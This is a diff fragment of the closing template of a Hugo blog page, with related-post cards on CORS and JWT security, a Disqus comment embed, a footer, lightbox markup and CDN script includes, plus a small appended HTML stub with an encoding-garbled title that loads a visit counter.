+                <img src="/p/cors/cors.2d6b65de8ecd4835ded4053a33196c57_hu_7bdf19c40225c166.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post CORS"
+                        
+                        data-hash="md5-LWtl3o7NSDXe1AU6MxlsVw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">CORS</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/jwt%E6%94%BB%E9%98%B2/">
+        
+        
+            <div class="article-image">
+                <img src="/p/jwt%E6%94%BB%E9%98%B2/jwt.d0fc529e8268e0ee65ef0e34d84ddecb_hu_1b177fad63e22083.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post JWT攻防"
+                        
+                        data-hash="md5-0PxSnoJo4O5l7w402E3eyw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">JWT攻防</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 Lsec&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>���¹鵵ҳ</title>
+    
+    <script defer src="https://cn.vercount.one/js"></script>
+</head>
+<body>
+</body>
+</html>
+    </body>
+</html>
